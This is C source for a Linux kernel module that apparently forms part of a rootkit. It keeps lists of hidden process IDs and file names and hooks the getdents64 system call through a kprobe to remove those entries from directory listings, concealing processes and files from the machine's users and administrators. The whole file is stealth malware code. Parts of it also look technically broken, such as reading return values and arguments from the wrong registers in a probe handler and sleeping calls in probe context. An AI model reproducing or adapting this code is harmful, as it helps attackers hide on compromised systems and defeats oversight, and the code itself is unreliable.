#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <asm/unistd.h>
#include <asm/ptrace.h>
#include "jky_ioctl.h"
#include "hooks.h"

/* ---------- hidden lists ---------- */

struct hidden_pid  { struct list_head list; int pid; };
struct hidden_file { struct list_head list; char name[256]; };

static LIST_HEAD(hidden_pids);
static LIST_HEAD(hidden_files);
static DEFINE_MUTEX(hidden_lock);

int jky_hide_pid(int pid) {
    struct hidden_pid *e;
    mutex_lock(&hidden_lock);
    list_for_each_entry(e, &hidden_pids, list) {
        if (e->pid == pid) { mutex_unlock(&hidden_lock); return 0; }
    }
    e = kzalloc(sizeof(*e), GFP_KERNEL);
    if (!e) { mutex_unlock(&hidden_lock); return -ENOMEM; }
    e->pid = pid;
    list_add(&e->list, &hidden_pids);
    mutex_unlock(&hidden_lock);
    return 0;
}

int jky_unhide_pid(int pid) {
    struct hidden_pid *e, *tmp;
    mutex_lock(&hidden_lock);
    list_for_each_entry_safe(e, tmp, &hidden_pids, list) {
        if (e->pid == pid) {
            list_del(&e->list);
            kfree(e);
            mutex_unlock(&hidden_lock);
            return 0;
        }
    }
    mutex_unlock(&hidden_lock);
    return -ENOENT;
}

int jky_hide_file(const char *path) {
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    struct hidden_file *e;
    mutex_lock(&hidden_lock);
    e = kzalloc(sizeof(*e), GFP_KERNEL);
    if (!e) { mutex_unlock(&hidden_lock); return -ENOMEM; }
    strncpy(e->name, base, sizeof(e->name) - 1);
    list_add(&e->list, &hidden_files);
    mutex_unlock(&hidden_lock);
    return 0;
}

int jky_unhide_file(const char *path) {
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    struct hidden_file *e, *tmp;
    mutex_lock(&hidden_lock);
    list_for_each_entry_safe(e, tmp, &hidden_files, list) {
        if (strcmp(e->name, base) == 0) {
            list_del(&e->list);
            kfree(e);
            mutex_unlock(&hidden_lock);
            return 0;
        }
    }
    mutex_unlock(&hidden_lock);
    return -ENOENT;
}

static int is_pid_hidden(int pid) {
    struct hidden_pid *e;
    int hidden = 0;
    mutex_lock(&hidden_lock);
    list_for_each_entry(e, &hidden_pids, list) {
        if (e->pid == pid) { hidden = 1; break; }
    }
    mutex_unlock(&hidden_lock);
    return hidden;
}

static int is_file_hidden(const char *name) {
    struct hidden_file *e;
    int hidden = 0;
    mutex_lock(&hidden_lock);
    list_for_each_entry(e, &hidden_files, list) {
        if (strcmp(e->name, name) == 0) { hidden = 1; break; }
    }
    mutex_unlock(&hidden_lock);
    return hidden;
}

/* ---------- kprobe on __x64_sys_getdents64 ---------- */

static int name_is_hidden_number(const char *name) {
    int pid = 0;
    const char *p = name;
    if (!*p) return 0;
    while (*p) {
        if (*p < '0' || *p > '9') return 0;
        pid = pid * 10 + (*p - '0');
        p++;
    }
    return is_pid_hidden(pid);
}

static void filter_dirents(void __user *dirp, long ret) {
    struct linux_dirent64 *kbuf;
    long offset = 0;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return;
    if (copy_from_user(kbuf, dirp, ret)) {
        kfree(kbuf);
        return;
    }

    while (offset < ret) {
        struct linux_dirent64 *d = (void *)kbuf + offset;
        int reclen = d->d_reclen;
        if (reclen <= 0) break;

        int hide = 0;
        if (name_is_hidden_number(d->d_name)) hide = 1;
        else if (is_file_hidden(d->d_name)) hide = 1;

        if (hide) {
            long remaining = ret - (offset + reclen);
            if (remaining > 0)
                memmove((void *)d, (void *)d + reclen, remaining);
            ret -= reclen;
            continue;
        }
        offset += reclen;
    }

    if (copy_to_user(dirp, kbuf, ret))
        pr_warn("jky: copy_to_user failed in filter_dirents\n");
    kfree(kbuf);
}

static void getdents64_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags) {
    (void)p; (void)flags;
    long ret = regs->ax;
    if (ret <= 0) return;

    void __user *dirp = (void __user *)regs->si;
    if (!dirp) return;

    filter_dirents(dirp, ret);
}

static struct kprobe kp_getdents64 = {
    .symbol_name  = "__x64_sys_getdents64",
    .post_handler = getdents64_post,
};

int jky_hooks_install(void) {
    int ret = register_kprobe(&kp_getdents64);
    if (ret < 0) {
        pr_err("jky: kprobe register failed: %d\n", ret);
        return ret;
    }
    pr_info("jky: kprobe hooked at %px\n", kp_getdents64.addr);
    return 0;
}

void jky_hooks_remove(void) {
    unregister_kprobe(&kp_getdents64);

    struct hidden_pid *p, *pt;
    list_for_each_entry_safe(p, pt, &hidden_pids, list) {
        list_del(&p->list); kfree(p);
    }
    struct hidden_file *f, *ft;
    list_for_each_entry_safe(f, ft, &hidden_files, list) {
        list_del(&f->list); kfree(f);
    }
    pr_info("jky: hooks removed\n");
}
